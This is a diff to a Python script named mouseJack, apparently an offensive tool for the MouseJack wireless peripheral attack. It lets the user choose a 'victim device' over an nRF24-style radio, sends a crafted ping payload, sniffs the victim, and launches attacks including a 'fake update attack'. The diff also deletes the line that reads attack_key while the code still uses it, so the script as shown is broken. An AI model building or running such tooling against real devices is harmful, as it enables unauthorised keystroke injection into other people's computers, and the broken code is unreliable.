@@ -5,12 +5,12 @@ import os
 
 
 def ping_channel(radio, channels):
-    ping = [0x0f, 0x0f, 0x0f, 0x0f]
+    ping = [0x00, 0xC1, 0x03, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14]
     for channel in channels:
         radio.set_channel(channel)
         if radio.transmit_payload(ping):
             break
-
+            
 
 class mouseJack:
     if __name__ == '__main__':
@@ -34,13 +34,12 @@ class mouseJack:
         consolePrint.printDevices()
         for key, val in devices_list.items():
             print(key, ":", val[0], "(", val[1], ")" , val[2])
-        print("choose victim device key from( 0 - ", len(devices_list.items()) - 1, "): ")
+        print("choose victim device key: ")
         victim_key = int(input())
         print()
         print()
         victim = devices_list[victim_key]
         consolePrint.printAttacks()
-        attack_key = int(input("choose attack key: "))
         if attack_key == 1:
             consolePrint.attackStarted()
             radio.enter_sniffer_mode(victim[0])
@@ -53,7 +52,7 @@ class mouseJack:
             consolePrint.attackStarted()
             radio.enter_sniffer_mode(victim[0])
             ping_channel(radio, channels)
-            fake_update_attack = fakeUpdate_attack.FakeUpdate_attack(victim[0], radio)
+            fake_update_attack = FakeUpdate_attack.FakeUpdate_attack(victim[0], radio)
             fake_update_attack.run()
             print("attack completed!")
             exit(1)
